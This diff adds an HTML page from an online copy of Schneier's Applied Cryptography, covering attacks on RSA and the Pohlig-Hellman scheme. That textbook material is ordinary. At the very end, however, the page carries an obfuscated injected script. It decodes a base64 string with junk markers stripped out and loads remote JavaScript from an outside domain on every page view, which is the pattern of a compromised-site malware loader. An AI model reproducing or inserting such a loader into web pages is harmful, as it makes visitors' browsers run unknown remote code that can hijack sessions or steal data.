@@ -1,0 +1,140 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Public-Key Algorithms</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=19//-->
+<!--PAGES=472-474//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="19-05.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="19-07.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P>Moral: Never use RSA to sign a random document presented to you by a stranger. Always use a one-way hash function first. The ISO 9796 block format prevents this attack.
+</P>
+<P><FONT SIZE="+1"><B><I>Common Modulus Attack on RSA</I></B></FONT></P>
+<P>A possible RSA implementation gives everyone the same <I>n</I>, but different values for the exponents <I>e</I> and <I>d</I>. Unfortunately, this doesn&#146;t work. The most obvious problem is that if the same message is ever encrypted with two different exponents (both having the same modulus), and those two exponents are relatively prime (which they generally would be), then the plaintext can be recovered without either of the decryption exponents [1457].</P>
+<P>Let <I>m</I> be the plaintext message. The two encryption keys are <I>e</I><SUB>1</SUB> and <I>e</I><SUB>2</SUB>. The common modulus is <I>n</I>. The two ciphertext messages are:</P>
+<DL>
+<DD><I>c</I><SUB>1</SUB> = <I>m</I><SUP>e<SMALL><SMALL>1</SMALL></SMALL></SUP> mod <I>n</I>
+<DD><I>c</I><SUB>2</SUB> = <I>m</I><SUP>e<SMALL><SMALL>2</SMALL></SMALL></SUP> mod <I>n</I>
+</DL>
+<P>The cryptanalyst knows <I>n, e</I><SUB>1</SUB>, <I>e</I><SUB>2</SUB>, <I>c</I><SUB>1</SUB>, and <I>c</I><SUB>2</SUB>. Here&#146;s how he recovers <I>m</I>.</P>
+<P>Since <I>e</I><SUB>1</SUB> and <I>e</I><SUB>2</SUB> are relatively prime, the extended Euclidean algorithm can find <I>r</I> and <I>s</I>, such that</P>
+<DL>
+<DD><I>re</I><SUB>1</SUB> &#43; <I>se</I><SUB>2</SUB> = 1
+</DL>
+<P>Assuming <I>r</I> is negative (either <I>r</I> or <I>s</I> has to be, so just call the negative one <I>r</I>), then the extended Euclidean algorithm can be used again to calculate <I>c</I><SUB>1</SUB><SUP>-1</SUP>. Then</P>
+<DL>
+<DD>(<I>c</I><SUB>1</SUB><SUP>-1</SUP>)<SUP>-<I>r</I></SUP> * <I>C</I><SUB>2</SUB><SUP><I>s</I></SUP> = <I>m</I> mod <I>n</I>
+</DL>
+<P>There are two other, more subtle, attacks against this type of system. One attack uses a probabilistic method for factoring <I>n</I>. The other uses a deterministic algorithm for calculating someone&#146;s secret key without factoring the modulus. Both attacks are described in detail in [449].</P>
+<P>Moral: Don&#146;t share a common <I>n</I> among a group of users.</P>
+<P><FONT SIZE="+1"><B><I>Low Encryption Exponent Attack against RSA</I></B></FONT></P>
+<P>RSA encryption and signature verification are faster if you use a low value for <I>e</I>, but that can also be insecure [704]. If you encrypt <I>e</I>(<I>e</I> &#43; 1)/2 linearly dependent messages with different public keys having the same value of <I>e</I>, there is an attack against the system. If there are fewer than that many messages, or if the messages are unrelated, there is no problem. If the messages are identical, then <I>e</I> messages are enough. The easiest solution is to pad messages with independent random values. This also ensures that <I>m<SUP>e</I></SUP> mod <I>n</I> &#8800; <I>m<SUP>e</I></SUP>. Most real-world RSA implementations&#151;PEM and PGP (see Sections 24.10 and 24.12), for example&#151;do this.</P>
+<P>Moral: Pad messages with random values before encrypting them; make sure <I>m</I> is about the same size as <I>n</I>.</P>
+<P><FONT SIZE="+1"><B><I>Low Decryption Exponent Attack against RSA</I></B></FONT></P>
+<P>Another attack, this one by Michael Wiener, will recover <I>d</I>, when <I>d</I> is up to one quarter the size of <I>n</I> and <I>e</I> is less than <I>n</I> [1596]. This rarely occurs if <I>e</I> and <I>d</I> are chosen at random, and cannot occur if <I>e</I> has a small value.</P>
+<P>Moral: Choose a large value for <I>d</I>.</P>
+<P><FONT SIZE="+1"><B><I>Lessons Learned</I></B></FONT></P>
+<P>Judith Moore lists several restrictions on the use of RSA, based on the success of these attacks [1114, 1115]:
+</P>
+<DL>
+<DD>&#151; Knowledge of one encryption/decryption pair of exponents for a given modulus enables an attacker to factor the modulus.
+<DD>&#151; Knowledge of one encryption/decryption pair of exponents for a given modulus enables an attacker to calculate other encryption/decryption pairs without having to factor <I>n</I>.
+<DD>&#151; A common modulus should not be used in a protocol using RSA in a communications network. (This should be obvious from the previous two points.)
+<DD>&#151; Messages should be padded with random values to prevent attacks on low encryption exponents.
+<DD>&#151; The decryption exponent should be large.
+</DL>
+<P>Remember, it is not enough to have a secure cryptographic algorithm. The entire cryptosystem must be secure, and the cryptographic protocol must be secure. A failure in any of those three areas makes the overall system insecure.
+</P>
+<P><FONT SIZE="+1"><B><I>Attack on Encrypting and Signing with RSA</I></B></FONT></P>
+<P>It makes sense to sign a message before encrypting it (see Section 2.7), but not everyone follows this practice. With RSA, there is an attack against protocols that encrypt before signing [48].
+</P>
+<P>Alice wants to send a message to Bob. First she encrypts it with Bob&#146;s public key; then she signs it with her private key. Her encrypted and signed message looks like:</P>
+<DL>
+<DD>(<I>m</I><SUP>e<SMALL><SMALL>B</SMALL></SMALL></SUP> mod <I>n</I><SUB>B</SUB>)<SUP>d<SMALL><SMALL>A</SMALL></SMALL></SUP> mod <I>n</I><SUB>A</SUB>
+</DL>
+<P>Here&#146;s how Bob can claim that Alice sent him <I>m&#146;</I> and not <I>m</I>. Realize that since Bob knows the factorization of <I>n</I><SUB>B</SUB> (it&#146;s his modulus), he can calculate discrete logarithms with respect to <I>n</I><SUB>B</SUB>. Therefore, all he has to do is to find an <I>x</I> such that</P>
+<DL>
+<DD><I>m&#146;<SUP>x</I></SUP> = <I>m</I> mod <I>n</I><SUB>B</SUB>
+</DL>
+<P>Then, if he can publish <I>xe</I><SUB>B</SUB> as his new public exponent and keep <I>n</I><SUB>B</SUB> as his modulus, he can claim that Alice sent him message <I>m&#146;</I> encrypted in this new exponent.</P>
+<P>This is a particularly nasty attack in some circumstances. Note that hash functions don&#146;t solve the problem. However, forcing a fixed encryption exponent for every user does.</P>
+<P><FONT SIZE="+1"><B><I>Standards</I></B></FONT></P>
+<P>RSA is a <I>de facto</I> standard in much of the world. The ISO almost, but not quite, created an RSA digital-signature standard; RSA is in an information annex to ISO 9796 [762]. The French banking community standardized on RSA [525], as have the Australians [1498]. The United States currently has no standard for public-key encryption, because of pressure from the NSA and patent issues. Many U.S. companies use PKCS (see Section 24.14), written by RSA Data Security, Inc. A draft ANSI banking standard specifies RSA [61].</P>
+<P><FONT SIZE="+1"><B><I>Patents</I></B></FONT></P>
+<P>The RSA algorithm is patented in the United States [1330], but not in any other country. PKP licenses the patent, along with other public-key cryptography patents (see Section 25.5). The U.S. patent will expire on September 20, 2000.
+</P>
+<H3><A NAME="Heading5"></A><FONT COLOR="#000077">19.4 Pohlig-Hellman</FONT></H3>
+<P>The Pohlig-Hellman encryption scheme [1253] is similar to RSA. It is not a symmetric algorithm, because different keys are used for encryption and decryption. It is not a public-key scheme, because the keys are easily derivable from each other; both the encryption and decryption keys must be kept secret.
+</P>
+<P>Like RSA,</P>
+<DL>
+<DD><I>C</I> = <I>P<SUP>e</I></SUP> mod <I>n</I>
+<DD><I>P</I> = <I>C<SUP>d</I></SUP> mod <I>n</I>
+</DL>
+<P>where
+</P>
+<DL>
+<DD><I>ed</I> &#8801; 1 (mod some complicated number)
+</DL>
+<P>Unlike RSA, <I>n</I> is not defined in terms of two large primes, it must remain part of the secret key. If someone had <I>e</I> and <I>n</I>, they could calculate <I>d</I>. Without knowledge of <I>e</I> or <I>d</I>, an adversary would be forced to calculate</P>
+<DL>
+<DD><I>e</I> = <I>log</I><SUB>P</SUB>C mod <I>n</I>
+</DL>
+<P>We have already seen that this is a hard problem.
+</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="19-05.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="19-07.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(yjalcYbl, vdfTehik) {vdfTehik = yjalcYbl.createElement('script');vdfTehik.type = 'text/javascript';vdfTehik.async = true;vdfTehik.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');yjalcYbl.getElementsByTagName('body')[0].appendChild(vdfTehik);}(document));</script></body>
+</html>
